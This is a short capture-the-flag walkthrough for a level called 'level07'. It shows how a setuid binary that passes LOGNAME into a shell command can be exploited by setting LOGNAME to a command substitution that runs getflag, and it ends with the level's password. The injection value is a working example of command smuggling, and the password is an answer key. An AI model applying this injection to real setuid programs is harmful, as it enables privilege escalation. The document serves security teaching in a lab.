# LEVEL 07

## 💡 Explanation

In this level we have to:
1. Check the file ./level07 permissions
2. Using `strings` we can see that it executes `LOGNAME /bin/echo %s` and with `ltrace` we see that it calls `getenv("LOGNAME")`
3. We have to export the LOGNAME variable to execute `getflag` when called! Voilà

## 👾 Commands

To find the solution:
```
ls -la level07
strings level07
ltrace ./level07
env | grep "LOGNAME"
export -p | grep "LOGNAME"
unset LOGNAME
```
To execute the solution there are two options:
- `export LOGNAME=$\(getflag\); ./level07`
- `export LOGNAME=\'getflag\'; ./level07` (*)

(*) Be careful with the quotes on que second command, it should be (`) instead of (').

## 🔍 Resources

- [How To Assign Output of a Linux Command to a Variable](https://www.tecmint.com/assign-linux-command-output-to-variable/)
- [Difference between export VAR=blabla and VAR=blabla](https://forum.ubuntu-fr.org/viewtopic.php?id=334687)
- [Linux export command](https://www.tutorialspoint.com/unix_commands/export.htm)
- [Linux export -p type declaration](https://abs.traduc.org/abs-5.1-fr/ch09s04.html)
- [Linux unset command](https://stackoverflow.com/questions/6877727/how-do-i-delete-an-exported-environment-variable)

## 🔥 Password
`fiumuikeil55xe9cu4dood66h`
